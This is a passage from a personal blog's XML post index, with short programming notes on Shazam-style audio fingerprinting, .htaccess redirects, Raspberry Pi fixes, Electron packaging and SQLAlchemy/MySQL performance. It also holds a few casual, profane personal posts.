    <content><![CDATA[<p>#Why?<br>Why even learn to code? People have been communication big ideas for centuries <em>without</em> needing to learn a new language. <br><br>What do you think?</p>
]]></content>
      <categories>
        <category>系统默认</category>
      </categories>
  </entry>
  <entry>
    <title>图片呀</title>
    <url>/articles/blogarchive/2018-09-29-11-25-22/</url>
    <content><![CDATA[<p>##图片图片！</p>
<p><img data-src="https://i.loli.net/2018/09/29/5baf62c4b9f9d.jpeg" alt="心华"><a href="https://i.loli.net/2018/09/29/5baf62c4b9f9d.jpeg">https://i.loli.net/2018/09/29/5baf62c4b9f9d.jpeg</a></p>
]]></content>
      <categories>
        <category>SiteDev</category>
      </categories>
  </entry>
  <entry>
    <title>我是茄子</title>
    <url>/articles/blogarchive/2018-10-03-22-50-44/</url>
    <content><![CDATA[<p>我鸟你妈的怎么垫底的又是我<br><br><a href="http://www.huomao.com/9418">点击进入我的直播间</a></p>
]]></content>
      <categories>
        <category>系统默认</category>
      </categories>
  </entry>
  <entry>
    <title>新的小工具--quizlet单词获取器</title>
    <url>/articles/blogarchive/2018-10-21-00-21-20/</url>
    <content><![CDATA[<p>#quizlet单词获取器<br><del>感觉博客空荡荡的，所以发一个</del><br><br><del>反正没人看</del><br><br>就是一个小工具，输入地址，然后就把单词和意思跳出来。可以做单词表用，其他没什么用处emmmmm。<br><br>感觉还真没什么用处。。。。<br><br><em>谁会来用这个啊喂</em><br><br>还是放点图出来吧。。。<br><br>输入链接<br><br><img data-src="https://i.loli.net/2018/10/21/5bcb54c734014.png" alt="输入链接"><br>获取成功<br><br><img data-src="https://i.loli.net/2018/10/21/5bcb54c6e3346.png" alt="获取成功"><br>随机生成<br><br><img data-src="https://i.loli.net/2018/10/21/5bcb54c726d72.png" alt="随机生成"></p>
<p>体验地址：<br><a href="https://www.lxgshadow.us/projects/dynamic/python/quizlet_words">https://www.lxgshadow.us/projects/dynamic/python/quizlet_words</a><br><br>平板写真tm难受<br></p>
]]></content>
      <categories>
        <category>SiteDev</category>
      </categories>
  </entry>
  <entry>
    <title>1122</title>
    <url>/articles/blogarchive/2018-11-22-14-11-04/</url>
    <content><![CDATA[<p>无聊&#x3D;自闭<br><br>自闭&#x3D;抑郁<br><br>抑郁&#x3D;自杀<br></p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=450 src="//music.163.com/outchain/player?type=0&id=2230227224&auto=1&height=430"></iframe>]]></content>
      <categories>
        <category>Life</category>
      </categories>
  </entry>
  <entry>
    <title>新功能上线，文件分享</title>
    <url>/articles/blogarchive/2018-11-27-20-57-44/</url>
    <content><![CDATA[<p>最新功能，文件分享。做的时候感觉有一堆用处，结果写完之后发现没啥屁用处。<br><br><img data-src="https://i.loli.net/2018/11/27/5bfd3ee93e8c4.png" alt="演示"><br>测试地址：<a href="https://lxgshadow.us/files/detail?id=1">https://lxgshadow.us/files/detail?id=1</a></p>
]]></content>
      <categories>
        <category>SiteDev</category>
      </categories>
  </entry>
  <entry>
    <title>.htaccess强制重定向www以及https</title>
    <url>/articles/blogarchive/2018-11-28-15-38-10/</url>
    <content><![CDATA[<p>今天遇见了一个问题，垃圾百度上什么都系都没找到，最后在stackoverflow上找到了解决方法。<br><br><a href="https://stackoverflow.com/questions/12050590/redirect-non-www-to-www-in-htaccess">https://stackoverflow.com/questions/12050590/redirect-non-www-to-www-in-htaccess</a><br></p>
<pre># Redirect to www
RewriteCond %{HTTP_HOST} ^[^.]+\.[^.]+$
RewriteCond %{HTTPS}s ^on(s)|
RewriteRule ^ http%1://www.%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
# Redirect to https
RewriteCond %{HTTPS} off
RewriteRule (.*) https://%{HTTP_HOST}/$1 [R=301,L]
</pre>]]></content>
      <categories>
        <category>Programming</category>
      </categories>
  </entry>
  <entry>
    <title>在automator里使用python3</title>
    <url>/articles/blogarchive/2018-12-31-22-23-25/</url>
    <content><![CDATA[<p>在automator里使用python3<br><br>使用&#x2F;bin&#x2F;bash,然后看下面代码。</p>
<pre>
export PATH+=:/usr/local/bin:/usr/bin:/bin
/usr/local/bin/python3 << "EOF" - "$@"
      //python codes
EOF
</pre>
<br>
e.g. 实现FFmpeg提取音频。
<pre>
export PATH+=:/usr/local/bin:/usr/bin:/bin
/usr/local/bin/python3 << "EOF" - "$@"
import sys,os
import subprocess

<p>files &#x3D; []<br>for f in sys.argv[1:]:<br>    files.append(f)<br>for file in files:<br>    videoPath &#x3D; file<br>    audioPath &#x3D; os.path.splitext(file)[0]+&quot;.m4a&quot;<br>    status &#x3D; subprocess.call([&quot;ffmpeg&quot;, &quot;-y&quot;, &quot;-i&quot;, videoPath, &quot;-acodec&quot;, &quot;copy&quot;, &quot;-vn&quot;, audioPath], shell&#x3D;False)<br>    if status &#x3D;&#x3D; 0:<br>        pass<br>    else:<br>        pass<br>EOF<br></pre></p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
  </entry>
  <entry>
    <title>检测浏览器切换页面</title>
    <url>/articles/blogarchive/2019-01-04-21-35-30/</url>
    <content><![CDATA[<p>本页面以加载以下代码，切换标签页看看吧.</p>
<pre>
var orig_title = document.title;
document.addEventListener('visibilitychange',function(){
    //浏览器切换事件
    if(document.visibilityState=='hidden') { //状态判断
        orig_title = document.title;
        document.title = '嘤嘤嘤~~~'; 
    }else {
        document.title = orig_title;
        myWaifu.showMessage("欢迎回来，Rua！",null)
    }
});
</pre>

<script>
var orig_title = document.title;
document.addEventListener('visibilitychange',function(){
    //浏览器切换事件
    if(document.visibilityState=='hidden') { //状态判断
        orig_title = document.title;
        document.title = '嘤嘤嘤~~~'; 
    }else {
        document.title = orig_title;
        myWaifu.showMessage("欢迎回来，Rua！",null);
    }
});
</script>]]></content>
      <categories>
        <category>Programming</category>
      </categories>
  </entry>
  <entry>
    <title>我日你妈的seminar</title>
    <url>/articles/blogarchive/2019-01-16-19-53-24/</url>
    <content><![CDATA[<p>#傻逼seminar我日你妈、</p>
]]></content>
      <categories>
        <category>隐藏</category>
      </categories>
  </entry>
  <entry>
    <title>shazam听歌识曲算法的解析与听歌识曲python实现的分析-1 读取歌曲</title>
    <url>/articles/blogarchive/2019-01-21-15-36-37/</url>
    <content><![CDATA[<p>###shazam听歌识曲算法的解析与听歌识曲python实现的分析-1 读取歌曲<br><br><br>开新坑，歌曲识别计划。<br><br>使用的算法是《An Industrial-Strength Audio Search Algorithm》，其中部分代码借鉴了Github的<a href="https://github.com/worldveil/dejavu">dejavu</a>项目。<br><br><br>关于读取歌曲，首先需要安装一个python库. <code>pydub</code>。你可以使用<code>pip3 install pydub</code>来安装。<br></p>
<pre>
audiofile = AudioSegment.from_file(filepath)
 # data = audiofile.get_array_of_samples()
 # Stereo audio array is in form of [sample_1_L, sample_1_R, sample_2_L, sample_2_R, …]
 data = np.fromstring(audiofile.raw_data, np.int16)
channels = []
 # Get data for different channel
for channel in range(audiofile.channels):
    channels.append(data[channel::audiofile.channels])
</pre>
<br>
`AudioSegment.from_file(filepath)`可以读取大部分音频，wav除外。在项目中，我们需要直接对音频信息进行操作，我们可以使用raw_data 来获取最原始的数据。另外我们需要知道音频的采样速率，用frame_rate 来获取。<br><br>
由于现在大部分音频都是立体声的（有多个通道），所以，对于每一个通道我们都需要分开处理。raw_data 返回的格式是这样子的[sample_1_L, sample_1_R, sample_2_L, sample_2_R, …] （在这里有左声道和右声道），分开不同的通道通道可以用切片来做`data[channel::audiofile.channels]`。<br><br>
这样子，读取音频的工作就完成了。<br><br>
另外，读取音频的时候可以计算一下文件的sha256值来作为这一首歌的唯一识别码。<br>

<pre>
def generateFilehash(filepath, blocksize=2 ** 16):
    sha = sha256()
    with open(filepath, "rb") as f:
        while True:
            buf = f.read(blocksize)
            if not buf:
                break
            sha.update(buf)
    return sha.hexdigest().upper()
</pre>

<p>其中，sha256可以替换为其他，如md5，sha1，sha128之类的，效果都一样。<br><br></p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>shazam</tag>
      </tags>
  </entry>
  <entry>
    <title>shazam听歌识曲算法解析+python实现-2 生成指纹</title>
    <url>/articles/blogarchive/2019-02-09-17-01-47/</url>
    <content><![CDATA[<p>第二部份<br>在开始之前，我们首先要认真阅读一下论文《An Industrial-Strength Audio Search Algorithm》，最好是一个字一个字，一个图一个图的把paper看下来（然后你就不需要来看这篇文章了，笑）</p>
<p>paper下载链接：<a href="https://www.ee.columbia.edu/~dpwe/papers/Wang03-shazam.pdf">https://www.ee.columbia.edu/~dpwe/papers/Wang03-shazam.pdf</a><br>中文翻译：<a href="https://blog.csdn.net/yutianzuijin/article/details/49787551">https://blog.csdn.net/yutianzuijin/article/details/49787551</a><br>建议读英文的鸭。</p>
<p>好的，那么正式开始。</p>
<p>基本原理：对于每个音频，我们都要给他生成一些特殊的指纹，然后用这些指纹和要识别的歌曲进行比较，最后取匹配率最高的那个，就是识别出来的歌曲啦~</p>
<p>听起来是不是非常简单鸭~~~~</p>
<p>那么怎么生成这个指纹呢，好问题！我们要分为三个步骤：</p>
<p>1、生成频谱图（频域图像）。</p>
<p>2、在频谱图的基础上计算出Constellation Map（星状图）</p>
<p>3、对星状图进行处理，生成指纹哈希。</p>
<p>首先是生成频谱图。</p>
<p>为了生成频谱图，我们就得把歌曲最开始拿出来的数据进行一波傅里叶变换，把时域信号转变为频域信号。</p>
<p>什么？你不知道傅里叶变换（Fourier Transformation）？不如看看这个<br><a href="https://zhuanlan.zhihu.com/p/19759362">https://zhuanlan.zhihu.com/p/19759362</a></p>
<p>但是，傅里叶变换有一个缺陷，那就是他在变换过程中把时间信息丢失了，也就是说傅里叶变换“不能反映时间维度局部区域上的特征, 人们虽然从傅立叶变换能清楚地看到一整段信号包含的每一个频率的分量值，但很难看出对应于频率域成分的不同时间信号的持续时间和发射的持续时间，缺少时间信息使得傅立叶分析再更精密的分析中失去作用[1]。“</p>
<p>在听歌识曲中，时间是一个非常重要的因素。如果我们没有了时间，我就不知道什么频率在什么时候出现，强度又是多少。</p>
<p>所以，我们不能抛弃时间这个变量。因此，我们可以利用短时傅里叶变换（STFT，short time Fourier transformation）来对音频数据进行分析和计算。<br>短时傅里叶变换通过加窗操作，把信号分成一段一段来计算，这样子在将时域型号转变为频域信号的同时，保留住时间了。</p>
<p>这看起来非常困难，但是！python中大量的第三方库给予了我们极大的便利。</p>
<p>这里我们用到了<code>matplotlib</code> 中的<code> mlab.specgram</code> 来对音频数据进行分析。</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5e97620b352.jpg" alt="生成频谱图"></p>
<p>如图所示，只要我们把上一步中取到的音频数据（sample 每一个channel中的数据），放到里面，然后加上一些参数就好啦。</p>
<p>对于这些参数，我们可以取默认值，也可以自己修改。有兴趣可以去官方文档里看。</p>
<p>我的取值是 nfft &#x3D; 4096, nooverlap &#x3D; 2048, window(加窗函数)用的是Hamming窗函数，fs是音频的采样速率。</p>
<p>接着，我们还可以对数据进行一些操作，比如：对取出来的值进行log运算，将其放到对数空间中，便于数据之间的比较与操作（因为不放入对数空间的话，数值可能会很大）。</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5e97620f54a.jpg" alt="放入对数空间中"></p>
<p>像这样，通过log10 之后的强度大小（或者说能量大小）范围便会控制在0-70这个范围之内啦。</p>
<p>频谱图的样子：</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5e97ac25331.jpg" alt="au中的"></p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5e97620f04b.jpg" alt="论文中的"></p>
<p>好的，生成了频谱图，接下来我们要做的就是第二步，生成Constellation Map！</p>
<p>首先我们来看看星状图到底长什么样（如果你读过paper,或许可能已经知道了）</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5e97620c085.jpg" alt="论文中下星状图"></p>
<p>根据paper中所说的，能量越大的点抗噪性就越强，所以我们将能量大的点作为判断依据。</p>
<p>在频谱图中，颜色越亮代表该点的能量越大。仔细观察一下，每个点（也就是星星）的位置是不是都在都在颜色比较亮的地方。</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5e97ac1a4e0.png" alt="myplot生成的"></p>
<p> 小小的解释一下，这个频谱图看起来是二维的，实际上是三维的，包含时间，频率，以及能量大小（强度）</p>
<p>那么，我们要如何找到这些能量较大的点呢？（由于up能力有限，只能复制粘贴别人的方法了）。</p>
<p>我们可以scipy利用图像分析法来找到这些点。</p>
<p>好的，我们请看worldveil大神在项目dejavu [2]中带来的算法（鼓掌！！！！！！！！）。</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5e9762206fe.jpg" alt="获得极值"></p>
<p>minimun_peak_amplitude 是可以认为是能量较大点的最小能量值（在log空间中它 的取值范围是0-70），取得越高，产生的能量较大点的数量就越少，准确率就越低，但也不要取的太小。我在这里取了minimun_peak_amplitude&#x3D;10<br>peak_neighborhood_size 是一个点想要成为能量较大点，也就是local maximum 所处的领域的大小。越小的话产生的点会越多，不建议太大，也不建议太小。我在这里取了peak_neighborhood_size &#x3D; 20</p>
<p>其中frequency_idx 和time_idx 就是能量较大的点所处的频率坐标和时间坐标了。</p>
<p>我们可以用zip函数把他们组成坐标的形式[(t1,f1),(t2,f2),(t3,f3)……]</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5e9761c092c.jpg" alt="zip函数"></p>
<p>其实到这里，我们已经可以通过这个星状图来对歌曲进行识别了，只要看某个片段是否能够与整首歌中某一块区域的对上就可以判断了。</p>
<p>论文的作者是这样子描述的：If you put the constellation map of a database song on a strip chart, and the constellation map of a short matching audio sample of a few seconds length on a transparent piece of plastic, then slide the latter over the former, at some point a significant number of points will coincide when the proper time offset is located and the two constellation maps are aligned in register. [4] 数据库中某首歌的星状图散乱在一个条形图上，然后将几秒样本的星状图放在一个透明的塑料板上。在条形图上滑行塑料板（有点像游标卡尺），到某个时刻的时候就会出现一件神奇的事情：当样本和数据库歌曲的正确位置对齐时，重叠的极大值就会格外多，这样就意味着样本和数据库中正确音乐的正确位置匹配上了！[3]</p>
<p>但是，这样子做需要耗费大量的时间，如何才能加快呢。我们可以对这些坐标进行快速组合哈希来获取最终的指纹。</p>
<p>所以第三步！对星状图进行处理，生成指纹哈希。</p>
<p>在生成指纹哈希的基本原理：将两个能量最高的点组合在一起，生成一个指纹，包含由两者的频率和时间差组成的哈希，以及锚点的时间位置。</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5e97620b9f9.jpg" alt="基本原理"></p>
<p>为此，我们首先要选择一个锚点（anchor point），然后每个锚点都对应一个目标区域（target zone）。（ps: 这个target zone 的选择极为讲究，我踩了一堆坑。）</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5e97620db47.jpg" alt="锚点和目标区域"></p>
<p>target zone与anchor point的距离不宜靠的太近，也不宜离得太远，</p>
<p>前者会导致选择的两个点没有独特性，从而使生成 的哈希没有什么卵用；</p>
<p>后者会导致两个点的时间跨度太大,也会使生成哈希没什么鸡儿用。所以，这个时候我们要认真看一下论文中的图。</p>
<p>上图可以发现，anchor point 和 target zone 之间至少隔了5个时间单位，小于5个时间单位的都没选。</p>
<p>所以，我们在选择target zone的时候，时间差最好要超过5个单位。如果你们不信的话可以自己试一试，up被这个坑了好久。</p>
<p>接下来上代码</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5e9761e5f41.jpg" alt="捕获排序"></p>
<p>首先，我们要对上一步中取得的那些能量较大点以时间顺序进行排序。</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5e97abef92f.jpg" alt="操作一波"></p>
<p>然后，我们将每一个能量较大点后的n个点作为target zone的范围。这个n称为fan-out。Fan-out用来决定每一个anchor point 最多可以与多少个点进行匹配。</p>
<p>同时，我们通过判断两个点之间的时间差是否在我们需要的范围内，来最终决定是否将这两个点作为歌曲的指纹放入数据库中。</p>
<p>time_constraint_condition 是一个 元组，包含可以作为指纹的两个点的最小时间差和最大时间差，up的取值是 (9,200)<br>fanout_factor 越大，生成的指纹就越多，在提高成功率的同时增大了所需要的储存空间以及牺牲了一点点的查询速度。up 的取值是 fanout_facotr &#x3D; 20 (论文中说大于10就可以了)</p>
<p>然后，我们只需要把两个点的频率以及时间差组合起来，生成一个哈希，在加上anchor point的时间位置，一个指纹就生成好了。</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5e97abe7bae.jpg" alt="生成指纹"></p>
<p>嘛，生成指纹的部分就完成啦。接下来就只有搜索与识别的部分了。</p>
<p>结束。</p>
<p>转载请先获得许可。</p>
<p>[1]: <a href="https://blog.csdn.net/lvsehaiyang1993/article/details/80521538">https://blog.csdn.net/lvsehaiyang1993/article/details/80521538</a></p>
<p>[2]: <a href="https://github.com/worldveil/dejavu">https://github.com/worldveil/dejavu</a></p>
<p>[3]: <a href="https://blog.csdn.net/yutianzuijin/article/details/49787551">https://blog.csdn.net/yutianzuijin/article/details/49787551</a></p>
<p>[4]: Wang, Avery. &quot;An Industrial Strength Audio Search Algorithm.&quot; Ismir. Vol. 2003. 2003.</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>shazam</tag>
      </tags>
  </entry>
  <entry>
    <title>Shazam听歌识曲算法解析+python实现-3 检索歌曲</title>
    <url>/articles/blogarchive/2019-02-09-20-39-15/</url>
    <content><![CDATA[<p>第三部份<br>在开始之前，我们首先要认真阅读一下论文《An Industrial-Strength Audio Search Algorithm》。 </p>
<p>paper下载链接：<a href="https://www.ee.columbia.edu/~dpwe/papers/Wang03-shazam.pdf">https://www.ee.columbia.edu/~dpwe/papers/Wang03-shazam.pdf</a><br>中文翻译：<a href="https://blog.csdn.net/yutianzuijin/article/details/49787551">https://blog.csdn.net/yutianzuijin/article/details/49787551</a><br>建议读英文的鸭。</p>
<p>为获得良好的阅读体验，你可能先需要了解 mysql数据库的基础知识，python基础语法，一定的代码阅读能力，一定的语文理解能力(up写的很乱)。</p>
<p>好的，那么今天我们进入最后一部分，搜索与匹配。</p>
<p>Up在这里使用了orm框架SQLalchemy</p>
<p>首先，我们要建立起一个数据库来储存上一步中获取的指纹信息。</p>
<p>其中一个表来储存歌曲信息，一个表来储存歌曲信息对应的指纹，两个表用歌曲的id作为外键相连。</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5ec8390fcbc.jpg" alt="sqlalchemy的格式"></p>
<p>注意，fingerprint 这个column 必须要加上index，这将会大大减少查询速度，千真万确。</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5ec838e9dd2.jpg" alt="songs表"><br>songs 表为歌曲信息表：</p>
<p>id 用来储存歌曲id，</p>
<p>name用来存储歌曲名字</p>
<p>filehash用来储存该歌曲文件的哈希</p>
<p>fingerprinted用来判断该歌曲是否已经进行了fingerprint</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5ec838bfdee.jpg" alt="fingerprints表"></p>
<p>Fingerprints 表为储存指纹的表：</p>
<p>id为指纹id，没什么用</p>
<p>song_id 是外键，记录对应的歌曲信息</p>
<p>fingerprint就是获取到的指纹信息</p>
<p>offset就是该指纹的offset位置</p>
<p>建完这个表，然后你就可以把指纹信息全都放进去了。</p>
<p>然后，我们来讲讲搜索与识别的基本原理：</p>
<p>1.首先输入一段声音，然后和之间一样，获取这一段声音的指纹。</p>
<p>2.对获取到的每一个指纹，在数据库中搜索相同的指纹，并将指纹对应的歌曲信息，以及offset偏移值保存。</p>
<p>3.有相同offset差值越多的歌曲就是识别出的歌曲。</p>
<p>tk’&#x3D;tk+offset,</p>
<p>这样子说可能有点抽象，我们来举个栗子:</p>
<p>假如在某个音频中，你提取到了1个指纹，这个指纹是 c19dde0ecb8fca81b6c98d5ee3775c26cbb32a610c82a5ecda515b0beb86d357， 且它在那段音频中的offset 是 30。</p>
<p>通过这个指纹，你在数据库中取到了如下的数据</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5ec838ebb90.jpg" alt="取得的数据"></p>
<p>然后我们可以计算得到 offset 差值分别为 70, 70 ,170, 20, 93, 160, 90, 70</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5ec83907757.jpg" alt="计算后"></p>
<p>在这里，我们可以看到，offset差值是70 且 id 为 1 的有3 个，offset差值是170 且 id 为 1的有一个，offset差值是20 且 id 为 2 的有1 个，offset差值是933 且 id 为 3 的有一个……</p>
<p>所以最多就是 有3个的那个值。也就是id为1的歌曲。</p>
<p>有人会问，为什么不一首歌一首歌的检索呢，因为慢。</p>
<p>接下来代码。<br>获取所有匹配的指纹，并将歌曲信息与offset差值保存下来。</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5ec838d9044.jpg" alt="匹配"></p>
<p>对数据进行处理，得出相同offset差值最多的歌曲，也就是识别出来的歌曲。</p>
<p><img data-src="https://i.loli.net/2019/02/09/5c5ec838f1c1a.jpg" alt="处理"></p>
<p>结束。</p>
<p>转载请先获得许可</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>shazam</tag>
      </tags>
  </entry>
  <entry>
    <title>Fininshing Update Shazam analysis(chinese version)</title>
    <url>/articles/blogarchive/2019-02-09-20-46-15/</url>
    <content><![CDATA[<p>See </p>
<p><a href="https://www.lxgshadow.us/blog/article-detail/13">First section</a><br>-<a href="https://www.bilibili.com/read/cv1904784">Bilibili</a></p>
<p><a href="https://www.lxgshadow.us/blog/article-detail/14">Second section</a>-<a href="https://www.bilibili.com/read/cv1965924">Bilibili</a></p>
<p><a href="https://www.lxgshadow.us/blog/article-detail/15">Third section</a>-<a href="https://www.bilibili.com/read/cv2016569">Bilibili</a></p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>shazam</tag>
      </tags>
  </entry>
  <entry>
    <title>Solution to mplayer playing voice and picture out of sync</title>
    <url>/articles/blogarchive/2019-02-11-22-53-22/</url>
    <content><![CDATA[<p>when i was playing with mplayer in my ras pi. I found that it always appear warning &quot;Your system is too slow to play this&quot;. And voice often play faster than the video.</p>
<p>after some modifying with config and option, i found nothing was helpful.</p>
<p>(Btw, you should tune the speed of lcd screen at least 48000000, but you may find some strange colour behaviour appear lol)</p>
<p>So, finally, i tried to re encode my video.</p>
<p>result turns out that we can simply solve this problem by encode the video into the older encoding format like <strong>mpg</strong> or <strong>ogg</strong>.</p>
<p><strong>don&#39;t</strong> use format like <strong>mp4</strong> or <strong>flv</strong></p>
<p>Result:</p>
<p><code>mplayer -nolirc -vo fbdev2:/dev/fb1 -fs -zoom -x 480 -y 320 ~/Videos/BadApple.mpg</code></p>
<p>ogg format:<br><img data-src="https://i.loli.net/2019/02/11/5c618bdf1bc7a.jpg" alt="ogg.JPG"></p>
<p>mpg format:<br><img data-src="https://i.loli.net/2019/02/11/5c618bdf2f6b5.jpg" alt="mpg.JPG"></p>
<p>flv format:<br><img data-src="https://i.loli.net/2019/02/11/5c618bdf26da4.jpg" alt="flv.JPG"></p>
<p>Look at the a-v,<br>You can see a significant difference between the mpg and flv.</p>
<p>Which means flv always face sync problem while mpg not.</p>
<p>Update:</p>
<p>add <code>-lavdopts skipframe=nonref:skiploopfilter=all</code> may helo</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>raspberryPi</tag>
      </tags>
  </entry>
  <entry>
    <title>raspberry pi using vnc, can&#39;t log in.</title>
    <url>/articles/blogarchive/2019-02-09-20-53-39/</url>
    <content><![CDATA[<p>Last night, when i was using vnc to log in my ras pi, i found that i stuck in the login menu.</p>
<p>which means even i type the correct password, after several sec, it going back to the login menu.</p>
<p>So, it turns out vnc may have some authoritive problem. WE can simply solve this problem by log in the ssh use：</p>
<p><code>rm -rf /home/pi/.Xauthority</code></p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>raspberryPi</tag>
      </tags>
  </entry>
  <entry>
    <title>Electron packaging</title>
    <url>/articles/blogarchive/2019-03-16-20-39-27/</url>
    <content><![CDATA[<p>Two method, electron-builder or electron-packager</p>
<h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><p> <code>npm isntall -g electron-packager</code> and  <code>npm isntall -g electron-builder</code></p>
<h2 id="Use-electron-packager"><a href="#Use-electron-packager" class="headerlink" title="Use electron packager:"></a>Use electron packager:</h2><p><code>electron-packager &lt;sourcedir&gt; &lt;appname&gt; &lt;platform&gt; &lt;architecture&gt; &lt;electron version&gt; &lt;optional options&gt;</code></p>
<p>e.g:</p>
<p><code>electron-packager . ApplicationName --win --out ./out --arch=x64 --overwrite --ignore=node_module</code></p>
<h2 id="Use-electron-builder"><a href="#Use-electron-builder" class="headerlink" title="Use electron builder"></a>Use electron builder</h2><p>add this script into your package.json</p>
<pre>
"build": {
    "appId": "com.xxx.app",
    "mac": {
      "target": ["dmg","zip"]
    },
    "win": {
      "target": ["nsis","zip"]
 }
</pre>
<p>Then, use <code>electron-builder</code>. You can also add args like <code>electron-builder --win --x64</code></p>
]]></content>
      <categories>
        <category>系统默认</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>electron</tag>
      </tags>
  </entry>
  <entry>
    <title>Improving sqlalchemy inserting performance for large set of data</title>
    <url>/articles/blogarchive/2019-04-06-17-28-58/</url>
    <content><![CDATA[<pre>
# using add()
for d in data:
    fingerprint0 = tbModel(id=d)
    session.add(fingerprint0)
session.commit()

# using bulk_save_objects
dbs.bulk_save_objects([tbModel(id = d) for d in data])
dbs.commit()


# using bulk_insert_mappings
session.bulk_insert_mappings(tbModel,[{"id": d,} for d in data])
  

# using core
def run(self):
session.execute(tbModel.__table__.insert(),[{"id": d, } for d in data])
session.commit()

</pre>

<p>in these four way, the speed</p>
<p><strong>core &gt; bulk_insert_mappings &gt; bulk_save_objects &gt;&gt;&gt;&gt;&gt; add()</strong></p>
<p>add is slower than others for almost 10 times</p>
<p>Just not use add when inserting large amount of data.</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>mysql</tag>
        <tag>sqlalchemy</tag>
      </tags>
  </entry>
  <entry>
    <title>Fix memory error caused by memory overflowing</title>
    <url>/articles/blogarchive/2019-04-06-17-38-45/</url>
    <content><![CDATA[<p>When I was adding all my song to the data base yesterday, I always found memory error after several song was processed.</p>
<p><a href="https://i.loli.net/2019/04/06/5ca87477be5a0.jpg"><img data-src="https://i.loli.net/2019/04/06/5ca87477be5a0.jpg" alt="memory error"></a></p>
<p>after checking the task manager, i found i got memory overflow when processing the song.</p>
<p>After doing some research, i come up with a solution.</p>
<p>By using <code>del</code> and <code>gc.collect()</code> after finish using a varible that takes lots of memory, the problem is successfully solved.</p>
<p><a href="https://i.loli.net/2019/04/06/5ca8737adf701.jpg"><img data-src="https://i.loli.net/2019/04/06/5ca8737adf701.jpg" alt="code1"></a></p>
<p><a href="https://i.loli.net/2019/04/06/5ca8737b03578.jpg"><img data-src="https://i.loli.net/2019/04/06/5ca8737b03578.jpg" alt="code2"></a></p>
]]></content>
      <categories>
        <category>系统默认</category>
      </categories>
  </entry>
  <entry>
    <title>use table partition to increase inserting performance</title>
    <url>/articles/blogarchive/2019-04-06-18-00-02/</url>
    <content><![CDATA[<p>when the number of data excess 5 million. mysql database will face a significant drop down in inserting speed. </p>
<p>(From 50,000 data per second to 50,000 data per minutes xD)</p>
<p>So we can &quot;split&quot; these data into different part by using mysql partition.</p>
<p>for example:</p>
<p><a href="https://i.loli.net/2019/04/06/5ca876ea63fb1.jpg"><img data-src="https://i.loli.net/2019/04/06/5ca876ea63fb1.jpg" alt="table"></a><br>total number of data<br><a href="https://i.loli.net/2019/04/06/5ca8775dafb2f.jpg"><img data-src="https://i.loli.net/2019/04/06/5ca8775dafb2f.jpg" alt="total"></a></p>
<p>change table to partition (<strong>the table can not have foreign key</strong>)</p>
<pre>
alter table songrecogn.fingerprints partition by range columns(id)
( PARTITION p0 VALUES LESS THAN (5000000),
  PARTITION p1 VALUES LESS THAN (10000000) ,
  PARTITION p2 VALUES LESS THAN (15000000) ,
  PARTITION p3 VALUES LESS THAN (20000000) ,
  PARTITION p4 VALUES LESS THAN (25000000) ,
  PARTITION p5 VALUES LESS THAN (30000000) ,
  PARTITION p6 VALUES LESS THAN (35000000) ,
  PARTITION p7 VALUES LESS THAN (40000000) ,
  PARTITION p8 VALUES LESS THAN (45000000) ,
  PARTITION p9 VALUES LESS THAN (50000000) ,
  PARTITION p10 VALUES LESS THAN (55000000) ,
  PARTITION p11 VALUES LESS THAN (60000000) ,
  PARTITION p12 VALUES LESS THAN (65000000) ,
  PARTITION p13 VALUES LESS THAN (70000000) ,
  PARTITION p14 VALUES LESS THAN (75000000),
  PARTITION p15 VALUES LESS THAN (80000000),
  PARTITION p16 VALUES LESS THAN (85000000),
  PARTITION p17 VALUES LESS THAN (90000000),
  PARTITION p18 VALUES LESS THAN (95000000),
  PARTITION p19 VALUES LESS THAN (100000000)
);
</pre>

<p>result:<br><a href="https://i.loli.net/2019/04/06/5ca8779ca8061.jpg"><img data-src="https://i.loli.net/2019/04/06/5ca8779ca8061.jpg" alt="files"></a></p>
<p>The inserting speed remains in 50,000 per seconds.</p>
<p><a href="https://i.loli.net/2019/04/06/5ca87888b3a7c.jpg"><img data-src="https://i.loli.net/2019/04/06/5ca87888b3a7c.jpg" alt="reuslt1"></a> </p>
<p>extra info:</p>
<pre>
# add partition
ALTER TABLE fingerprints ADD PARTITION(
 PARTITION p2- VALUES LESS THAN (150000000)
);

# remove partition (data not lost)
alter table fingerprints remove partitioning

# remove partition (data lost)
alter table fingerprints drop partition p20
</pre>
]]></content>
      <categories>
        <category>系统默认</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Problem about install windows 10 in mac os with bootcamp.</title>
    <url>/articles/blogarchive/2019-04-17-16-43-23/</url>
